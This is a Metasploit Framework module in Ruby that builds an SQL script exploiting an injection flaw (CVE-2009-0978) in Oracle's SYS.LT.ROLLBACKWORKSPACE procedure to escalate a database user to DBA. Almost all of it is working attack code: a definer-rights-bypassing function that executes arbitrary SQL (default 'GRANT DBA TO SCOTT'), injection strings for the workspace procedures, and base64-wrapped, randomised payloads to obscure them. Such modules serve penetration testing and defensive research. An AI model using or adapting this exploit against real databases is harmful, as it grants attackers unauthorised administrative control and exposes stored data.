##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection in SYS.LT.ROLLBACKWORKSPACE Procedure.',
			'Description'    => %q{
					This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in
					SYS.LT.ROLLBACKWORKSPACE procedure. Tested on Oracle 10g R1.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2009-0978' ],
					[ 'URL', 'http://www.appsecinc.com/resources/alerts/oracle/2009-03.shtml' ],
				],
			'DisclosureDate' => 'May 4 2009'))

			register_options( 
				[
					OptString.new('SQL',        [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
					OptString.new('USER',       [ false, 'The current user. ',  'SCOTT']),
					OptString.new('FILENAME',   [ false, 'The file name.',  'msf.sql']),
					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
				
				], self.class)
	end

	def run
		name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		ws    = Rex::Text.rand_text_alpha_upper(rand(5) + 1)

		function = %Q|
			CREATE OR REPLACE FUNCTION #{name} return varchar2
			authid current_user AS
			pragma autonomous_transaction;
			BEGIN
			EXECUTE IMMEDIATE '#{datastore['SQL']}';
			COMMIT;
			RETURN '#{ws}';
			END;
			|

		prepare = "BEGIN SYS.LT.CREATEWORKSPACE('#{ws}'' and #{datastore['USER']}.#{name}()=''#{ws}');END;"
		
		exploiting = "BEGIN SYS.LT.ROLLBACKWORKSPACE('#{ws}'' and #{datastore['USER']}.#{name}()=''#{ws}');END;"
		
		fun = Rex::Text.encode_base64(function)
		prp = Rex::Text.encode_base64(prepare)
		exp = Rex::Text.encode_base64(exploiting)

		sql = %Q|
			DECLARE
			#{rand1} VARCHAR2(32767);
			#{rand2} VARCHAR2(32767);
			#{rand3} VARCHAR2(32767);
			BEGIN
			#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun}')));
			EXECUTE IMMEDIATE #{rand1};
			EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name} TO PUBLIC';
			#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));
			EXECUTE IMMEDIATE #{rand2};
			#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp}')));
			EXECUTE IMMEDIATE #{rand3};
			END;
			/
			DROP FUNCTION #{name};
			|

		print_status("Creating '#{datastore['FILENAME']}' file ...")		
		file_create(sql)
	end
end 
